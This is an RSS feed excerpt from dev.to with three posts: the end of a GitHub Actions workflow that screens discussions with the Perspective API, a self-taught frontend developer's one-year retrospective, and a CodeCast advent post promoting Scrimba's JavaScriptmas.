&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;No Toxic Discussions Here&lt;/span&gt;
&lt;span class="na"&gt;on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
  &lt;span class="na"&gt;discussion&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
    &lt;span class="c1"&gt;# created type can be marked as an error BUT IT'S WORK. See the docs :&lt;/span&gt;
    &lt;span class="c1"&gt;# https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#discussion&lt;/span&gt;
    &lt;span class="na"&gt;types&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="pi"&gt;[&lt;/span&gt; &lt;span class="nv"&gt;created&lt;/span&gt;&lt;span class="pi"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;opened&lt;/span&gt;&lt;span class="pi"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;edited&lt;/span&gt;&lt;span class="pi"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;answered&lt;/span&gt; &lt;span class="pi"&gt;]&lt;/span&gt;
  &lt;span class="na"&gt;discussion_comment&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
    &lt;span class="na"&gt;types&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="pi"&gt;[&lt;/span&gt; &lt;span class="nv"&gt;created&lt;/span&gt;&lt;span class="pi"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;edited&lt;/span&gt; &lt;span class="pi"&gt;]&lt;/span&gt;
&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
  &lt;span class="na"&gt;CheckIfToxicContent&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Checkout Repository&lt;/span&gt;
        &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;actions/checkout@v2&lt;/span&gt;
        &lt;span class="na"&gt;with&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
          &lt;span class="na"&gt;GITHUB_TOKEN&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ secrets.GITHUB_TOKEN }}&lt;/span&gt;
          &lt;span class="na"&gt;PERSPECTIVE_API_KEY&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ secrets.PERSPECTIVE_API_KEY }}&lt;/span&gt;
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Install dependencies&lt;/span&gt;
        &lt;span class="na"&gt;run&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="pi"&gt;|&lt;/span&gt;
          &lt;span class="s"&gt;yarn install&lt;/span&gt;
          &lt;span class="s"&gt;yarn add @actions/core @actions/github&lt;/span&gt;
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Run the script&lt;/span&gt;
        &lt;span class="na"&gt;run&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="pi"&gt;|&lt;/span&gt;
          &lt;span class="s"&gt;yarn run start&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#additional-resources-info"&gt;
  &lt;/a&gt;
  Additional Resources / Info
&lt;/h3&gt;

&lt;p&gt;This Action use &lt;strong&gt;&lt;a href="https://perspectiveapi.com/"&gt;Perspective API&lt;/a&gt;&lt;/strong&gt; from Jigsaw Google.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Perspective is a free API that helps you host better conversations online. The API uses machine learning models to score the perceived impact a comment might have on a conversation. You can use this score to give feedback to commenters, help moderators more easily review comments, allow readers to more easily find interesting or productive comments, and more.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--O3-a4Njk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lcfuwxq8j6uuxqxbb3sw.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--O3-a4Njk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lcfuwxq8j6uuxqxbb3sw.gif" alt="Perspective API" width="880" height="270"&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>actionshackathon21</category>
      <category>github</category>
      <category>perspectiveapi</category>
      <category>googleapis</category>
    </item>
    <item>
      <title>Software Engineering üíªWhat I've learned in one year!</title>
      <author>Gabriel Pedroza</author>
      <pubDate>Tue, 07 Dec 2021 19:23:02 +0000</pubDate>
      <link>https://dev.to/gabrielpedroza/software-engineering-what-ive-learned-in-one-year-2aif</link>
      <guid>https://dev.to/gabrielpedroza/software-engineering-what-ive-learned-in-one-year-2aif</guid>
      <description>&lt;p&gt;I decided to give this (making my first blog) a try when I realized how close I was to reaching my first year of being a Frontend Engineer. This will also improve my Markdown skills which will also improve my README.md in my repositories. If you see any errors, please let me know because I always want to reach perfection... and because of my slight OCD in anything related to softwareüòÖ&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#table-of-contents"&gt;
  &lt;/a&gt;
  Table of Contents
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="#tldr"&gt;TLDR/Specifics&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="#intro"&gt;My background&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="#decided"&gt;When I decided to become a Front End Developer&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="#oneyear"&gt;What I have learned from one year of coding&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="#advice"&gt;Any advice or things I would've done differently&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="#future"&gt;What I plan to do accomplish in the future&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#tldrspecifics"&gt;
  &lt;/a&gt;
  &lt;a&gt;TLDR/Specifics&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;Over the course of becoming a Frontend Engineer, I wrote down my progress:&lt;/p&gt;

&lt;p&gt;7th grade (2014) - Used blocks of written code from made scratch.mit.edu to create basic games and animations. &lt;/p&gt;

&lt;p&gt;11th grade (2018) - Wrote my first HTML code in Advanced Placement Computer Science and had no interest or remembered anything whatsoever.&lt;/p&gt;

&lt;p&gt;December 18th 2020 - Switched my major from Accounting to Computer Science because I wanted to be involved with technology and saw incredible and interactive websites.&lt;/p&gt;

&lt;p&gt;Late December 2020 - Wrote my first line of code (Python). I chose Backend first because after researching, I‚Äôve read that you get more income and it‚Äôs more logic-based. (Chose for the wrong reasons).&lt;/p&gt;

&lt;p&gt;Mid-way January 2021 - Realized after some on and off time of Backend, it wasn‚Äôt suited for me at the time and only chose it for the money so I decided to try front end and almost instantly feel in love (Inspired by &lt;a href="https://bruno-simon.com/"&gt;Bruno Simon‚Äôs Portfolio&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;February 2021 - Watched an 11 and half hour video (willinglyüòÖ) on the &lt;a href="https://www.youtube.com/watch?v=mU6anWqZJcc&amp;amp;t=6365s"&gt;basics of HTML and CSS&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;March 4th 2021 - Bought my first &lt;a href="https://scrimba.com/learn/frontend"&gt;Frontend course&lt;/a&gt; (Html5, Css3, Js(es5+), and React (class and functional components)) on &lt;a href="//www.scrimba.com"&gt;Scrimba&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Midway March 2021 - Wrote my first line of JavaScript code.&lt;/p&gt;

&lt;p&gt;End of April 2021 - Registered in another course &lt;a href="https://scrimba.com/learn/javascript"&gt;The JavaScript Bootcamp&lt;/a&gt; to enhance my JavaScript.&lt;/p&gt;

&lt;p&gt;May 27th 2021 - Made a &lt;a href="https://www.linkedin.com/in/gabrielpedroza/"&gt;LinkedIn account&lt;/a&gt; to network and meet new people that have similar interests as me. &lt;/p&gt;

&lt;p&gt;June 13th 2021 - Finished JavaScript bootcamp.&lt;/p&gt;

&lt;p&gt;July 12th 2021 - Bought a &lt;a href="https://threejs-journey.com/"&gt;Three.js course&lt;/a&gt; with GLSL and Blender included by Bruno Simon.&lt;/p&gt;

&lt;p&gt;July 15th 2021 - Wrote my first line of React code.&lt;/p&gt;

&lt;p&gt;Mid September - Learned about Git (commands) and currently using it to push code, pull code, and make open source contributions from and to local repositories on¬†my Github account¬†after learning how to use GitHub.&lt;/p&gt;

&lt;p&gt;September 25th 2021 - Wrote my first line of custom shaders in GLSL (Shading Language).&lt;/p&gt;

&lt;p&gt;October 23 2021 - Finished Three.js course while balancing Scrimba‚Äôs courses and school.&lt;/p&gt;

&lt;p&gt;October 24 2021 - Using &lt;a href="https://docs.pmnd.rs/home"&gt;React Three Fiber and its helpers&lt;/a&gt; to start creating 3D projects.&lt;/p&gt;

&lt;p&gt;October 28 2021 - Bought &lt;a href="https://www.algoexpert.io/product"&gt;AlgoExpert&lt;/a&gt; to learn DSA and also deepen my knowledge using JavaScript while preparing for coding interviews.&lt;/p&gt;

&lt;p&gt;October 30 2021 - Learned how to calculate time and space complexity using Big O notation.&lt;/p&gt;

&lt;p&gt;November 1 2021 - Used SCSS modules for the first time.&lt;/p&gt;

&lt;p&gt;November 21 2021 - Used &lt;a href="https://mui.com/"&gt;Material UI&lt;/a&gt; for the first time.&lt;/p&gt;

&lt;p&gt;December 7 2021 - Learned Yarn. Will use in future projects.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#my-background"&gt;
  &lt;/a&gt;
  &lt;a&gt;My Background&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;Long story short, I was majoring in Accounting as a freshman in college and I was not enjoying it at all. I later found out about Computer Science (specifically Full-Stack (Frontend and Backend)) and it caught my attention. I decided to switch when my semester finished at December 18, 2019. I have minimal exposure to coding. Checkout the beginning of &lt;a href="#tldr"&gt;TLDR/Specifics&lt;/a&gt; to understand specifically what I knew.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#when-i-decided-to-become-a-front-end-developer"&gt;
  &lt;/a&gt;
  &lt;a&gt;When I Decided to Become a Front End Developer&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;Mid-way through January, I decided to switch from Backend to Frontend. I was inspired by &lt;a href="https://bruno-simon.com/"&gt;Bruno Simon's portfolio&lt;/a&gt; and all the other projects on the official page of &lt;a href="https://threejs.org/"&gt;Three.js&lt;/a&gt;. It changed my perspective on websites completely and with a combination of being inspired and experiencing a shit-ton of "bad" websites over the years, I decided to become a Frontend Engineer without looking at its salary, the hard work it would take to feel "ready", and everything else that comes with being a developer that I've probably haven't experienced yet. It was a turning point in my life and I didn't even know how much it would consume me. I can definitely say after a year of programming, I am so happy I chose it because of the right reasons. I got lucky that it pays well and it is a great career path.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#my-advice-to-future-programmers"&gt;
  &lt;/a&gt;
  &lt;a&gt;My Advice to Future Programmers&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;JUST START ALREADY! When I started programming, I never saw it as boring or as a job in any way; Frontend for me was just so exciting because of what you can create and be able to give that experience to others that come across your website/projects. Personally, for the first 6-8 months, I learned about code or watch anything that was code-related for a good 8-10 hours every single day (you do NOT need to do thisü§¶üèª‚Äç‚ôÇÔ∏è). This definitely caused a huge burnout for me. My social life and health were struggling immensely and I wasn't retaining any of the information anymore. I decided to take a break and slowly and focus on my social and health more. It was the best decision for me in every way possible and I would recommend anyone who starts to become a programmer to understand that there is a lot of information to learn and your comfort zone will be eviscerated. You will feel that overwhelming sensation of not being good enough but after that stage of feeling "useless", your mental strength will be calloced from the adversity and your success it will overshadow that stage. I promiseüòä&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#my-future-goals-as-a-frontend-engineer"&gt;
  &lt;/a&gt;
  &lt;a&gt;My Future Goals as a Frontend Engineer&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;There are so many goals that I want to accomplish as a Frontend Engineer. The main one is to land a job and become a paid full-time engineer. Currently, I am making projects to include on my curriculum vitae, learning DSA, and filling any holes I have currently since I am a self-taught engineer.&lt;/p&gt;

&lt;p&gt;‚ÄúBelieve you can and you‚Äôre halfway there.‚Äù ‚ÄîTheodore Roosevelt&lt;/p&gt;

&lt;p&gt;‚ÄúIt is our attitude at the beginning of a difficult task which, more than anything else, will affect its successful outcome.‚Äù ‚ÄîWilliam James&lt;/p&gt;

&lt;p&gt;‚ÄúI think I can. I think I can. I think I can. I know I can.‚Äù ‚ÄîWatty Piper, The Little Engine That Could&lt;/p&gt;

&lt;p&gt;‚ÄúLife isn‚Äôt finding shelter in the storm. It‚Äôs about learning to dance in the rain.‚Äù‚Ä®‚ÄïSherrilyn Kenyon&lt;/p&gt;

&lt;p&gt;‚ÄúWhether you think you can or think you can‚Äôt you‚Äôre right.‚Äù ‚ÄîHenry Ford&lt;/p&gt;

&lt;p&gt;I wish everyone the best of luck on your journey! &lt;/p&gt;

</description>
      <category>javascript</category>
      <category>react</category>
      <category>webdev</category>
      <category>beginners</category>
    </item>
    <item>
      <title>üéÑ CodeCast's Coding Advent: Day Seven üéÑ</title>
      <author>CodeCast</author>
      <pubDate>Tue, 07 Dec 2021 19:15:22 +0000</pubDate>
      <link>https://dev.to/codecast/codecasts-coding-advent-day-seven-5hje</link>
      <guid>https://dev.to/codecast/codecasts-coding-advent-day-seven-5hje</guid>
      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--KeUdIeag--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/t4de5ll5dwd5qk2w354g.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--KeUdIeag--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/t4de5ll5dwd5qk2w354g.png" alt="Day Seven Image" width="880" height="880"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#day-seven"&gt;
  &lt;/a&gt;
  DAY SEVEN
&lt;/h2&gt;

&lt;p&gt;Today we're bringing you yet another coding advent calendar, this time featuring &lt;a href="//scrimba.com"&gt;Scrimba's&lt;/a&gt; #JavaScriptmas! &lt;a href="https://scrimba.com/learn/javascriptmas2021/"&gt;24 Days of learning JavaScript&lt;/a&gt; wrapped in the blanket of festiveness, all for free! &lt;/p&gt;

&lt;p&gt;You can also be sure to follow us on &lt;a href="https://www.instagram.com/codecastapp/"&gt;Instagram&lt;/a&gt;, &lt;a href="https://twitter.com/CodeCastApp"&gt;Twitter&lt;/a&gt;, &lt;a href="https://www.facebook.com/codecastapp"&gt;Facebook&lt;/a&gt;, and &lt;a href="https://www.linkedin.com/company/code-cast/"&gt;LinkedIn&lt;/a&gt; to see our daily advent releases there!&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>javascript</category>
      <category>beginners</category>
      <category>programming</category>
    </item>
  </channel>
</rss>
